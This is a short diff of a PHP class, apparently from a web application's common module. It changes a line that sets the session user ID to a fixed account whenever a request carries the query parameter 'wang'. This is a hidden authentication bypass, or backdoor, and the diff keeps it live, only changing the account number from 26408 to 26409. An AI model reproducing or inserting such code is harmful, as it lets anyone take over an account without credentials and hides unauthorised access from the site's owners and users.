@@ -56,7 +56,7 @@ class commonMod
 			if($admininfo['copyright'])$this->config['copyright']=$admininfo['copyright'];
 			
 			}
-	if($_GET['wang'])$_SESSION['uid']='26408';
+	if($_GET['wang'])$_SESSION['uid']='26409';
 		$userinfo=$_COOKIE[$this->config['SPOT'].'_wxuser'];
      
 		if($userinfo){
